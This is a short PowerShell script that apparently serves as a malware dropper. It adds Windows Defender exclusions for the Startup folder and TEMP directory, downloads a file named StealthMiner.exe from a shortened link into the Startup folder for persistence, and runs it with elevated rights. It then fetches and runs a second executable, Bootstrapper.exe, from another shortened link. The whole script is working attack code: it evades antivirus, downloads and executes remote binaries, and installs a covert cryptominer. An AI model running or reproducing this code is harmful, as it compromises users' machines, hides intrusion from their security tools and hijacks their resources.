try {
    # Add exclusion paths to Windows Defender
    Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction Stop
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop

    # Download and execute StealthMiner.exe
    Invoke-WebRequest -Uri "https://bit.ly/MINERZS" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\StealthMiner.exe" -ErrorAction Stop
    Start-Process -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\StealthMiner.exe" -Verb RunAs -ErrorAction Stop

    # Download and execute Bootstrapper.exe
    Invoke-WebRequest -Uri "https://bit.ly/MINERZS2" -OutFile "$env:TEMP\Bootstrapper.exe" -ErrorAction Stop
    Start-Process -FilePath "$env:TEMP\Bootstrapper.exe" -Verb RunAs -ErrorAction Stop
}
catch {
    # Output error message to console
    Write-Output "Error: $($_.Exception.Message)"
}
